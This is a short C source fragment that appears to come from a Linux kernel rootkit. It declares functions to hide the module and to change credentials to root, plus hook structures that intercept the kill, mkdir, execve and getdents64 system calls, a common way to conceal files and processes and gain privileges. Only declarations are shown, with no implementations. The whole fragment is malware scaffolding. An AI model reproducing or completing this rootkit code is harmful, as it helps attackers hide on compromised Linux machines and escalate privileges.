/*
file for the all of the hooked functions and other relevant code
*/
#include <linux/dirent.h>

extern int BUFFER_SIZE; //size of buffers used


bool module_hidden = false; //variable to see if the module is hidden
static struct list_head *prev_module; //location of the previous module

static int hide_rootkit(void); //function to unhide\hide the rootkit
static int set_root(void); //changes credentials

static asmlinkage long hooked_kill(const struct pt_regs *regs); //hook function
static asmlinkage long hooked_mkdir(const struct pt_regs *regs); //hook function
static asmlinkage long hooked_execve(const struct pt_regs *regs); //hook function
static asmlinkage long hooked_getdents64(const struct pt_regs *regs); //hook function

struct hook_t sys_kill = {.hooked_syscall = hooked_kill, .syscall_number = __NR_kill}; //the hook_t struct for use within module
struct hook_t sys_mkdir = {.hooked_syscall = hooked_mkdir, .syscall_number = __NR_mkdir}; //the hook_t struct for use within module
struct hook_t sys_execve = {.hooked_syscall = hooked_execve, .syscall_number = __NR_execve}; //the hook_t struct for use within module
struct hook_t sys_getdents64 = {.hooked_syscall = hooked_getdents64, .syscall_number = __NR_getdents64}; //the hook_t struct for use within module
